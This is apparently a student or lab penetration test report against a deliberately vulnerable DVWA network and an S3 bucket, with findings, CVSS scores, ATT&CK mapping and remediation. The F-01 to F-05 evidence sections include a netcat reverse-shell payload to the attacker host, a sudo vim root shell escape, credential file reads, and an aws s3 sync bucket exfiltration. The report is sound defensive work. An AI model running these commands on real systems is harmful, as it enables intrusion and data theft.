**PENETRATION TEST REPORT**

Vulnerable Network Lab — Internal Infrastructure Assessment

| Client Organisation | ACME Solution Industry |

| --- | --- |

| Assessment Type | Black-box / Grey-box Network Penetration Test |

| Scope | DMZ Web Server, Internal Host, Cloud Infrastructure |

| Tester | Ejiofor Godswill |

This document is confidential and intended solely for ACME Solution Industry. Unauthorised distribution is strictly prohibited.

## 1.  EXECUTIVE SUMMARY

Between 1 July and 8 July 2026, the assessment team conducted a penetration test against the ACME Solution Industry network environment. Beginning from an external, unauthenticated position, the team achieved full internal network compromise and successfully exfiltrated sensitive data from a cloud storage resource.

The assessment identified eight distinct vulnerabilities spanning the web application layer, host configuration, credential management, and cloud infrastructure. Four findings are rated Critical severity. The most significant outcome was a complete, unbroken attack chain from initial web application exploitation through to root-level system access and cloud data exfiltration — accomplished without triggering any detection or alerting controls.

**Risk Summary**

| Severity | Count | Summary |

| --- | --- | --- |

| Critical | 4 | Command injection RCE, unsecured SSH private key, sudo privilege escalation, S3 data exfiltration |

| High | 2 | Exposed AWS credentials on disk, SSH service exposed on DMZ host |

| Medium | 2 | Apache directory listing, default application credentials |

| Low | 1 | Service version disclosure via response headers and banners |

**Attack Chain**

| Step | Stage | Technique | Outcome |

| --- | --- | --- | --- |

| 1 | Reconnaissance | nmap service scan, gobuster enumeration | Apache 2.4.58, OpenSSH 9.6p1, /DVWA/ path identified |

| 2 | Initial Access | Default credentials (admin / password) | Authenticated session on DVWA |

| 3 | Exploitation | OS command injection via DVWA ping module | Remote code execution as www-data |

| 4 | Post-Exploitation | Reverse shell, PTY upgrade | Stable interactive shell on DMZ host |

| 5 | Discovery | Filesystem enumeration | SSH private key at /var/www/.ssh/id_rsa |

| 6 | Lateral Movement | SSH with discovered private key | Access to internal host as devadmin |

| 7 | Privilege Escalation | sudo vim -c ':!/bin/bash' | Root shell on internal host |

| 8 | Cloud Discovery | AWS credentials file at /root/.aws/credentials | S3 bucket and IAM identity confirmed |

| 9 | Exfiltration | aws s3 sync to local directory | Complete bucket contents downloaded |

**Overall Risk Rating**

**Critical — Immediate Remediation Required**

The network presents a complete, exploitable attack path from external access to sensitive cloud data. All Critical and High findings require immediate remediation. A follow-up assessment is recommended after remediation to validate controls.

## 2.  SCOPE & METHODOLOGY

2.1  Scope

| Target | IP / Endpoint | In Scope |

| --- | --- | --- |

| Router / Firewall (WAN) | 192.168.64.130 | Yes — entry point |

| DMZ Web Server (DMZtarget) | 192.168.10.3 (via DNAT) | Yes |

| Internal Host (manager) | 192.168.20.3 | Yes — via lateral movement |

| Cloud Infrastructure | AWS S3 (comp-secure-backups) | Yes |

| Attacker Platform (Parrot) | 192.168.64.136 | No — attack origin only |

2.2  Methodology

The assessment followed a structured, phased methodology aligned with PTES (Penetration Testing Execution Standard) and the OWASP Testing Guide:

- Phase 1 — Reconnaissance: Passive and active scanning to enumerate services, versions, and web content

- Phase 2 — Vulnerability Identification: Manual web application testing, credential analysis, configuration review

- Phase 3 — Exploitation: Active exploitation of identified vulnerabilities to establish initial access

- Phase 4 — Post-Exploitation: Privilege escalation, lateral movement, credential discovery

- Phase 5 — Exfiltration: Cloud credential validation and data extraction from identified storage resources

- Phase 6 — Reporting: Evidence documentation, CVSS v3.1 scoring, MITRE ATT&CK mapping, remediation planning

2.3  Tools

| Tool | Version | Purpose |

| --- | --- | --- |

| nmap | 7.94 | Network scanning, port discovery, service version enumeration, NSE scripting |

| gobuster | 3.x | Web directory and file enumeration |

| Firefox | Latest | Web application interaction, DVWA testing |

| netcat (OpenBSD) | 1.226 | Reverse shell listener, TCP connectivity testing |

| AWS CLI | 2.x | Cloud credential validation, S3 bucket enumeration and exfiltration |

| python3 | 3.12 | PTY spawn for interactive shell upgrade |

| SSH client | 9.x | Lateral movement using discovered private key |

## 3.  DETAILED FINDINGS

All findings are scored using CVSS v3.1. Findings are ordered by severity. Each finding includes a description, business impact assessment, annotated evidence, MITRE ATT&CK mapping, and concrete remediation guidance.

#### F-01   OS Command Injection — Remote Code Execution

Severity: Critical   |   CVSS Base Score: 9.9 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.9 | Critical |

**Description**

DVWA v2.5 is deployed on the DMZ web server with its security level set to Low. The Command Injection module passes user input from the ping address field directly to a PHP shell_exec() call with no sanitisation, validation, or encoding. Any attacker authenticated to DVWA using default credentials can append arbitrary OS commands to the input field using shell separator characters (semicolon, double-ampersand, pipe). This results in command execution as the www-data web server service account on the DMZ host.

**Business Impact**

Successful exploitation provides remote code execution on the DMZ web server. From this foothold the attacker can read the local filesystem, establish a persistent reverse shell, and pivot to adjacent network hosts using credentials discovered on the server. In this engagement, this vulnerability was the primary initial access vector that initiated the complete attack chain resulting in root access on the internal host and exfiltration of cloud-hosted sensitive data.

**Evidence**

# Payload confirming command injection:

127.0.0.1; id

Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell payload (mkfifo — avoids -e flag dependency):

127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.64.136 4444 >/tmp/f

#### Figure 7. Command injection confirmed — ping baseline test

#### Figure 8. Ping output returned — server-side shell execution confirmed

#### Figure 9. '; id' payload — uid=33(www-data) confirms OS command execution

#### Figure 10. '; whoami' payload — confirms www-data execution context

#### Figure 11. Reverse shell payload injected via DVWA command injection field

#### Figure 12. Netcat listener on Parrot receives connection — www-data shell active

#### MITRE ATT&CK

- T1190 — Exploit Public-Facing Application

- T1059.004 — Command and Scripting Interpreter: Unix Shell

- T1133 — External Remote Services

**Remediation**

- Set DVWA security level to High or Impossible — never deploy a deliberately vulnerable training application on any network-accessible host

- Implement strict allowlist input validation — restrict the IP address field to valid IPv4 format only

- Replace shell_exec() with escapeshellarg() or migrate to a network library that does not invoke OS shell commands

- Deploy a Web Application Firewall to detect and block command injection patterns

- Remove DVWA from any network-accessible environment entirely

#### F-02   Unsecured SSH Private Key on DMZ Web Server

Severity: Critical   |   CVSS Base Score: 9.9 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.9 | Critical |

**Description**

Filesystem enumeration from the www-data shell revealed an SSH configuration directory at /var/www/.ssh/ containing a private RSA key (id_rsa) and a config file referencing an internal host at 192.168.20.3. The private key was generated without a passphrase, meaning any party in possession of the file can use it immediately with no additional cracking steps. The key was confirmed to grant passwordless SSH authentication to the internal host as the devadmin user.

**Business Impact**

This finding completely undermined the network segmentation architecture. The router's iptables rules restricted DMZ-to-Internal communication, but possession of a valid SSH key allowed the attacker to traverse this boundary using a permitted channel. No matter how well-configured the firewall, a single misplaced credential rendered the segmentation ineffective. This was the highest-impact finding in the engagement when considered in context of the lateral movement it enabled.

**Evidence**

# Discovery via filesystem enumeration:

find /var/www -name 'id_rsa' 2>/dev/null

Output: /var/www/.ssh/id_rsa

# SSH config reveals target:

cat /var/www/.ssh/config

Output: Host entry for 192.168.20.3 as devadmin

# Lateral movement — no password prompt:

ssh -i /var/www/.ssh/id_rsa devadmin@192.168.20.3

#### Figure 14. Filesystem enumeration — /var/www/.ssh/ directory containing id_rsa and config

#### Figure 15. SSH config file — reveals 192.168.20.3 as target internal host

#### Figure 16. SSH authentication to internal host as devadmin — no password required

#### MITRE ATT&CK

- T1552.004 — Unsecured Credentials: Private Keys

- T1021.004 — Remote Services: SSH

- T1078 — Valid Accounts

**Remediation**

- Remove all SSH private keys from web server filesystems immediately

- Implement a secrets management solution (HashiCorp Vault, AWS Secrets Manager) for all deployment credentials

- Use SSH certificate-based authentication with short-lived certificates rather than long-lived private key files

- Audit all authorized_keys files across the infrastructure to identify all hosts accessible via the exposed key

- Rotate all SSH keys immediately — treat any key that may have been on the web server as compromised

- Implement file integrity monitoring on web server filesystems to alert on unauthorised file creation

#### F-03   Privilege Escalation via sudo NOPASSWD — vim

Severity: Critical   |   CVSS Base Score: 7.8 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 7.8 | High |

**Description**

The devadmin account on the internal host has the following sudoers entry: devadmin ALL=(ALL) NOPASSWD: /usr/bin/vim. This grants devadmin the ability to execute vim as root without providing a password. vim is documented on GTFOBins as a Unix binary with a built-in shell escape mechanism (:!/bin/bash) that spawns a child shell inheriting the parent process's effective user ID. Since vim was launched via sudo as root, the spawned shell is a root shell. This privilege escalation requires a single command and zero additional tooling.

**Business Impact**

Root-level access on the internal host provides complete control over the system — reading all files, modifying system configurations, installing persistent backdoors, disabling monitoring, and accessing credentials stored on disk. In this engagement, root access enabled discovery of AWS credentials at /root/.aws/credentials, which were used to enumerate and exfiltrate data from a cloud storage bucket containing sensitive organisational data.

**Evidence**

# Enumerate sudo permissions:

sudo -l

Output: (ALL) NOPASSWD: /usr/bin/vim

# GTFOBins technique — shell escape:

sudo vim -c ':!/bin/bash'

# Confirm root:

id

Output: uid=0(root) gid=0(root) groups=0(root)

#### Figure 17. sudo -l output — NOPASSWD: /usr/bin/vim entry confirmed

#### Figure 18. sudo vim -c ':!/bin/bash' executed — id confirms uid=0(root)

#### MITRE ATT&CK

- T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

- T1078.003 — Valid Accounts: Local Accounts

- T1059.004 — Unix Shell (shell escape from vim)

**Remediation**

- Remove the NOPASSWD flag from the devadmin sudoers entry immediately

- Replace vim sudo access with sudoedit scoped to specific files — sudoedit does not support shell escapes

- Audit all sudoers entries across the infrastructure for NOPASSWD grants to GTFOBins-listed binaries

- Enable sudo logging and configure alerting for privilege escalation events via /var/log/auth.log

- Implement a PAM solution to centralise, monitor, and audit all privileged access

#### F-04   S3 Bucket Data Exfiltration via Exposed AWS Credentials

Severity: Critical   |   CVSS Base Score: 9.3 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N | 9.3 | Critical |

**Description**

Following privilege escalation to root on the internal host, a .aws directory was discovered in /root/ containing valid AWS access keys. These credentials were used to authenticate to AWS, enumerate available S3 buckets, and download the complete contents of the comp-secure-backups bucket containing sensitive organisational data including customer records, contracts, HR files, financial data, and network inventory information. The bucket was exfiltrated in full to a local directory on the attacker's machine.

**Business Impact**

Data exfiltration from cloud storage represents the highest-impact outcome of this engagement. The attacker now holds a copy of the exfiltrated data regardless of any subsequent network remediation. The AWS credentials, if not rotated, provide continued cloud access from any internet-connected machine — the attacker does not require ongoing network access to continue using them. Depending on the data contents, this finding may trigger regulatory reporting obligations under GDPR, NDPR, or applicable data protection frameworks.

**Evidence**

# AWS credentials discovered:

cat /root/.aws/credentials

Output: aws_access_key_id, aws_secret_access_key

# Identity confirmed:

aws sts get-caller-identity

# Bucket discovered and exfiltrated:

aws s3 ls

aws s3 sync s3://comp-secure-backups ./comp-secure-backups

Output: customers.csv, contracts_summary.txt, employees.csv, payroll_2026.csv, network_inventory.csv

#### Figure 13. Post-exploitation OS enumeration — hostname, kernel, user context

#### Figure 19. Root directory listing — .aws/ directory identified

#### Figure 20. AWS credentials and config files present in /root/.aws/

#### Figure 21. AWS credentials file contents — access key and secret key visible

#### Figure 22. AWS caller identity confirmed — IAM account and user ARN retrieved

#### Figure 23. Sensitive customer data identified in bucket

#### Figure 24. S3 bucket comp-secure-backups listed via aws s3 ls

#### Figure 25. Bucket contents enumerated recursively — multiple sensitive files identified

#### Figure 26. Bucket contents confirmed — sensitive data categories visible

#### Figure 27. aws s3 sync complete — full bucket exfiltrated to local directory

#### MITRE ATT&CK

- T1552.001 — Unsecured Credentials: Credentials in Files

- T1619 — Cloud Storage Object Discovery

- T1530 — Data from Cloud Storage

- T1048 — Exfiltration Over Alternative Protocol (HTTPS)

- T1078.004 — Valid Accounts: Cloud Accounts

**Remediation**

- Rotate all exposed AWS credentials immediately — treat them as fully compromised

- Never store cloud credentials on server filesystems — use IAM instance roles or secrets management solutions

- Implement IAM least-privilege — storage credentials should be scoped to specific buckets and specific operations only

- Enable AWS CloudTrail logging and configure alerts for anomalous S3 download activity

- Enable S3 server access logging and configure bucket policies preventing public access

- Restrict outbound HTTPS from internal hosts to approved endpoints — unrestricted egress enabled this exfiltration

- Consider AWS Macie for continuous sensitive data discovery and classification in S3

#### F-05   AWS Credentials Stored in Plaintext on Internal Host

Severity: High   |   CVSS Base Score: 8.2 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N | 8.2 | High |

**Description**

A plaintext AWS credentials file was found at /root/.aws/credentials on the internal host containing a valid aws_access_key_id and aws_secret_access_key. Storing cloud credentials as plaintext files on server filesystems — particularly in root-owned directories — is a well-documented insecure practice that creates a persistent, high-impact credential exposure independent of the method by which an attacker gains access to the host.

**Business Impact**

Unlike network-based credentials that require ongoing access to the compromised network, cloud API keys can be used from any internet-connected machine after exfiltration. An attacker who copies these credentials gains indefinite access to associated AWS resources until the keys are explicitly rotated. These credentials directly enabled the S3 bucket exfiltration documented in F-04.

**Evidence**

ls -la /root/.aws/

Output: credentials  config

cat /root/.aws/credentials

[default]

aws_access_key_id = AKIAxxxxxxxxxxxxxxxx

aws_secret_access_key = [REDACTED AWS SECRET KEY]

#### MITRE ATT&CK

- T1552.001 — Unsecured Credentials: Credentials in Files

- T1078.004 — Valid Accounts: Cloud Accounts

**Remediation**

- Rotate all exposed AWS credentials immediately

- Implement AWS IAM roles rather than long-lived access keys wherever possible

- Use AWS Secrets Manager or HashiCorp Vault to distribute credentials — never store as plaintext files

- Audit all servers for .aws/credentials, .env files, and other credential storage locations

- Deploy automated secret scanning to detect credential exposure continuously

- Set up AWS GuardDuty for continuous anomalous credential usage detection

#### F-06   Apache Directory Listing Enabled

Severity: Medium   |   CVSS Base Score: 5.3 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | Medium |

**Description**

Apache is configured with the Indexes option enabled in its global configuration. When no index file is present, Apache generates an HTML directory listing of the web root, exposing all files and subdirectories including the /DVWA/ path to any unauthenticated user. This was captured by nmap's http-ls NSE script during initial reconnaissance.

**Business Impact**

Directory listing eliminated the need for directory brute-force enumeration, immediately exposing the /DVWA/ application path. In a production environment this misconfiguration could expose backup files, database dumps, source code, or configuration files placed in the web root.

**Evidence**

nmap -sC 192.168.64.130

|_http-title: Index of /

| http-ls: Volume /

| -  2026-06-27 19:00  DVWA/

#### Figure 4. Apache directory listing exposed — /DVWA/ path visible without authentication

#### MITRE ATT&CK

- T1083 — File and Directory Discovery

- T1590 — Gather Victim Network Information

**Remediation**

- Remove the Indexes option from Apache's Options directive in /etc/apache2/apache2.conf

- Ensure all publicly accessible directories contain an index file

- Implement deny-all as default for directory browsing with explicit enables only where required

#### F-07   Default Application Credentials — DVWA

Severity: Medium   |   CVSS Base Score: 9.8* / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8* | Critical (base score — see note) |

**Description**

DVWA was accessible using the default, publicly-documented credentials (admin / password) with no modification from the out-of-box installation. These credentials are the first attempt any attacker would make against a DVWA installation. Authentication with these credentials provided full access to all vulnerability modules, including the Command Injection module that enabled initial exploitation.

**Business Impact**

Default credentials represent zero-effort access. In this engagement they were the gateway to command injection exploitation. The CVSS base score of 9.8 reflects the industry-standard scoring for default credentials providing full application access. It is classified Medium in this report's priority ordering because DVWA is a deliberately vulnerable training application; in a production application this finding would be rated Critical.

**Evidence**

# Credentials tested:

Username: admin   Password: password

Result: Full authenticated access — all vulnerability modules accessible

#### Figure 5. DVWA login page accessible at 192.168.64.130/DVWA/login.php

#### Figure 6. Successful login with default credentials — DVWA dashboard accessible

#### MITRE ATT&CK

- T1078 — Valid Accounts

- T1110.001 — Brute Force: Password Guessing

**Remediation**

- Change default credentials on all applications immediately upon deployment

- Implement account lockout after a defined number of failed authentication attempts

- Deploy multi-factor authentication on all administrative interfaces

- Remove DVWA from any internet-accessible environment

#### F-08   Service Version Disclosure via Response Headers and Banners

Severity: Low   |   CVSS Base Score: 5.3 / 10.0

| CVSS v3.1 Vector String | Base Score | Rating |

| --- | --- | --- |

| CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | Medium |

**Description**

Both Apache and OpenSSH broadcast precise version strings: Apache/2.4.58 (Ubuntu) in every HTTP response header, and OpenSSH 9.6p1 Ubuntu during the SSH handshake. nmap captured both version strings during initial reconnaissance without requiring authentication.

**Business Impact**

Precise version disclosure assists attackers in identifying applicable CVEs and targeting version-specific exploits. This reduces research time significantly and lowers the barrier to targeted attack planning.

**Evidence**

nmap -sV 192.168.64.130

22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu

80/tcp  open  http  Apache httpd 2.4.58

curl -I http://192.168.64.130

Server: Apache/2.4.58 (Ubuntu)

#### Figure 1. Initial nmap scan — ports 22 and 80 identified as open

#### Figure 2. nmap -sV — Apache 2.4.58 and OpenSSH 9.6p1 version strings captured

#### Figure 3. CVE research on Apache 2.4.58 — applicable vulnerabilities identified

#### MITRE ATT&CK

- T1592 — Gather Victim Host Information

- T1046 — Network Service Discovery

**Remediation**

- Set ServerTokens Prod and ServerSignature Off in /etc/apache2/apache2.conf

- Configure SSH to suppress version information where possible

- Implement a reverse proxy or WAF that normalises the Server response header

- Keep all services patched to the latest stable version regardless of banner disclosure

## 4.  FINDINGS SUMMARY

| ID | Title | Severity | CVSS | Host | MITRE |

| --- | --- | --- | --- | --- | --- |

| F-01 | OS Command Injection — RCE | Critical | 9.9 | DMZtarget (192.168.10.3) | T1190, T1059.004 |

| F-02 | Unsecured SSH Private Key | Critical | 9.9 | DMZtarget (192.168.10.3) | T1552.004, T1021.004 |

| F-03 | Sudo Privilege Escalation — vim | Critical | 7.8 | manager (192.168.20.3) | T1548.003 |

| F-04 | S3 Bucket Data Exfiltration | Critical | 9.3 | AWS Cloud | T1530, T1048 |

| F-05 | AWS Credentials on Disk | High | 8.2 | manager (192.168.20.3) | T1552.001 |

| F-06 | Apache Directory Listing | Medium | 5.3 | DMZtarget (192.168.10.3) | T1083 |

| F-07 | Default Credentials — DVWA | Medium | 9.8 | DMZtarget (192.168.10.3) | T1078 |

| F-08 | Service Version Disclosure | Low | 5.3 | DMZtarget (192.168.10.3) | T1592 |

## 5.  REMEDIATION PLAN

5.1  Priority Schedule

| Priority | Finding | Action | Owner | Deadline |

| --- | --- | --- | --- | --- |

| P1 — Immediate | F-02 SSH Private Key | Remove key, audit authorized_keys, rotate all SSH keys | Systems Admin | 24 hours |

| P1 — Immediate | F-04 / F-05 AWS Keys | Rotate all exposed credentials, audit IAM policies | Cloud Admin | 24 hours |

| P1 — Immediate | F-03 Sudo Privesc | Remove NOPASSWD vim, replace with sudoedit | Systems Admin | 24 hours |

| P2 — Urgent | F-01 Command Injection | Input validation, raise DVWA security level, deploy WAF | Dev Team | 48 hours |

| P3 — High | F-07 Default Credentials | Change all default credentials, implement MFA | All Teams | 7 days |

| P4 — Medium | F-06 Directory Listing | Remove Indexes from Apache Options, restart service | Systems Admin | 30 days |

| P4 — Medium | F-08 Version Disclosure | ServerTokens Prod, ServerSignature Off | Systems Admin | 30 days |

5.2  Technical Remediation

**Apache — DMZtarget**

# Disable directory listing:

sudo nano /etc/apache2/apache2.conf

# Change: Options Indexes FollowSymLinks

# To:     Options FollowSymLinks

# Suppress version disclosure:

echo 'ServerTokens Prod' | sudo tee -a /etc/apache2/conf-enabled/security.conf

echo 'ServerSignature Off' | sudo tee -a /etc/apache2/conf-enabled/security.conf

sudo systemctl restart apache2

**Sudo — Internal Host**

sudo visudo

# Remove: devadmin ALL=(ALL) NOPASSWD: /usr/bin/vim

# Replace (if file editing access is required):

devadmin ALL=(ALL) sudoedit /etc/specific-config-file

**SSH Key — DMZtarget**

sudo rm -rf /var/www/.ssh/

find /home /root -name 'authorized_keys' -exec cat {} \;

# Remove the compromised public key from all authorized_keys files

**AWS Credentials**

# Deactivate key immediately via AWS Console:

# IAM → Users → [user] → Security Credentials → Deactivate

# Remove from server filesystem:

sudo rm -rf /root/.aws/

5.3  Architectural Recommendations

- Implement a dedicated bastion host pattern for all administrative access — disable direct SSH on DMZ hosts

- Deploy a Web Application Firewall in front of all public-facing applications

- Implement egress filtering — restrict outbound HTTPS from internal hosts to approved destinations using FQDN-based rules

- Deploy AWS GuardDuty for continuous threat detection across the cloud environment

- Implement network intrusion detection (Suricata or Snort) to alert on lateral movement and shell activity

- Establish a vulnerability management programme with regular scanning and patching cycles

- Conduct annual penetration tests and quarterly vulnerability assessments

## 6.  MITRE ATT&CK MAPPING

| Tactic | Technique ID | Technique Name | Finding |

| --- | --- | --- | --- |

| Reconnaissance | T1046 | Network Service Discovery | F-08 |

| Reconnaissance | T1592 | Gather Victim Host Information | F-08 |

| Reconnaissance | T1083 | File and Directory Discovery | F-06 |

| Initial Access | T1190 | Exploit Public-Facing Application | F-01 |

| Initial Access | T1078 | Valid Accounts (default credentials) | F-07 |

| Execution | T1059.004 | Unix Shell Command Execution | F-01 |

| Privilege Escalation | T1548.003 | Sudo and Sudo Caching Abuse | F-03 |

| Privilege Escalation | T1078.003 | Local Account Abuse | F-03 |

| Credential Access | T1552.004 | Unsecured Credentials: Private Keys | F-02 |

| Credential Access | T1552.001 | Unsecured Credentials: Files | F-05 |

| Lateral Movement | T1021.004 | Remote Services: SSH | F-02 |

| Discovery | T1619 | Cloud Storage Object Discovery | F-04 |

| Discovery | T1078.004 | Valid Cloud Accounts | F-04, F-05 |

| Exfiltration | T1530 | Data from Cloud Storage | F-04 |

| Exfiltration | T1048 | Exfiltration Over Alternative Protocol (HTTPS) | F-04 |

## 7.  DOCUMENT SIGN-OFF

| Role | Name | Signature | Date |

| --- | --- | --- | --- |

| Lead Penetration Tester | Ejiofor Godswill | ________________________ | 8 July 2026 |

| Report Co-Author | Demilada | ________________________ | 8 July 2026 |

| Assessor / Grader | ________________________ | ________________________ | ________________________ |

ACME Solution Industry — Penetration Test Report — July 2026 — Confidential
